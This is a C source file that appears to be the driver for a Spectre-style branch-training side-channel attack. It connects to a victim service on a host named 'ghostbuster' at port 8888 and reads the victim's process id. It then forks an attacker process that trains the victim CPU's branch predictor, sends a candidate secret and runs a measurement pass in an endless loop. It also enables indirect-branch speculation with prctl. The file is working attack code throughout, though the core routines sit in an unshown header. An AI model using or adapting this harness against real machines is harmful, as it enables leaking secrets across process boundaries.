#define _GNU_SOURCE

#include <err.h>
#include <time.h>
#include <fcntl.h>
#include <netdb.h>
#include <sched.h>
#include <stdio.h>
#include <signal.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <stdbool.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/prctl.h>
#include <immintrin.h>
#include <sys/socket.h>
#include <netinet/in.h>

#include "common.h"

#define ATTACKER   "./attacker/attacker"
#define VICTIM_CPU 1

static int devnull;

static pid_t connect_to_socket(const char *ip, int *result_socket)
{
  int pid, s;

  s = socket(AF_INET, SOCK_STREAM, 0);
  if (s == -1) {
    warn("socket");
    return -1;
  }

  struct sockaddr_in sin;
  inet_pton(AF_INET, ip, &sin.sin_addr.s_addr);
  sin.sin_port = htons(8888);
  sin.sin_family = AF_INET;

  while (1) {
    if (connect(s,(struct sockaddr_in *) &sin, sizeof(sin)) != 0) {
      warn("connect()");
      return -1;
    } else {
      break;
    }
  }

  uint8_t buf[64];
  if (read(s, buf, sizeof(buf)) <= 0) {
    warn("read first");
    return -1;
  }

  buf[sizeof(buf)-1] = '\x00';
  if (buf[0] != '[') {
    warnx("header mismatch");
    return -1;
  }

  pid = atoi((char *)buf + 1);

  *result_socket = s;

  return pid;
}

static void attack_socket(int s, uint8_t *candidate)
{
  usleep(1000);
  if (write(s, candidate, SECRET_SIZE) != SECRET_SIZE) {
    err(1, "write");
  }

  uint8_t buf[64];
  if (read(s, buf, sizeof(buf)) <= 0) {
    warn("read second");
    sleep(1);
  }

  if (shutdown(s, SHUT_RDWR) != 0) {
    err(1, "shutdown");
  }

  close(s);
}

static pid_t run_process(char *arg1, bool do_wait, int cpu)
{
  pid_t pid;

  pid = fork();
  if (pid == -1) {
    err(1, "fork");
  }
  else if (pid == 0) {
    put_on_cpu(cpu);

    if (prctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0) == -1) {
      err(1, "PR_SET_PDEATHSIG");
    }

    char * const argv[] = { ATTACKER, arg1, NULL };
    run_attacker(arg1 != NULL ? 2 : 1, argv);
    exit(0);
  }

  if (do_wait) {
    if (waitpid(pid, NULL, 0) != pid) {
      err(1, "waitpid");
    }
  }

  return pid;
}

static uint64_t run(const char *ip, uint8_t xor)
{
  pid_t pid_victim, pid_attacker;
  uint8_t candidate[SECRET_SIZE];
  int s = -1;

  memset(candidate, xor, sizeof(candidate));

  pid_victim = connect_to_socket(ip, &s);
  if (pid_victim == -1) {
    errx(1, "error while connecting to socket");
  }

  /* flush */
  run_process("0", true, VICTIM_CPU + 1);

  /* train */
  pid_attacker = run_process(NULL, false, VICTIM_CPU);

  /* wait for victim */
  attack_socket(s, candidate);

  /* kill attacker */
  if (kill(pid_attacker, SIGKILL) != 0) {
    err(1, "kill");
  }
  if (waitpid(pid_attacker, NULL, 0) != pid_attacker) {
    err(1, "waitpid");
  }

  /* measure */
  char buf[64];
  snprintf(buf, sizeof(buf), "x%d %d", pid_victim, xor);
  run_process(buf, true, VICTIM_CPU + 1);

  return 0;
}

static void ctrlc(int dummy)
{
  fprintf(stderr, "got CTRL-C, exiting...\n");
  _exit(1);
}

static void hostname_to_ip(char *hostname, char *ip, size_t size)
{
  struct in_addr **addr_list;
  struct hostent *he;

  he = gethostbyname(hostname);
  if (he == NULL) {
    err(1, "gethostbyname");
  }

  addr_list = (struct in_addr **)he->h_addr_list;
  strncpy(ip , inet_ntoa(*addr_list[0]), size);
}

int main(int argc, const char *argv[])
{
  char ip[32];

  hostname_to_ip("ghostbuster", ip, sizeof(ip));

  put_on_cpu(1 + rand() % 7);

  if (signal(SIGINT, ctrlc) == SIG_ERR || signal(SIGTERM, ctrlc)) {
    err(1, "signal");
  }

  if (prctl(PR_SET_SPECULATION_CTRL, PR_SPEC_INDIRECT_BRANCH, PR_SPEC_ENABLE, 0, 0) != 0) {
    err(1, "prctl");
  }

  devnull = open("/dev/null", O_RDWR);
  if (devnull == -1) {
    err(1, "open(\"/dev/null\")");
  }

  init_attacker();

  while (1) {
    uint8_t c;
    c = 0x00;
    run(ip, c);
  }

  return 0;
}
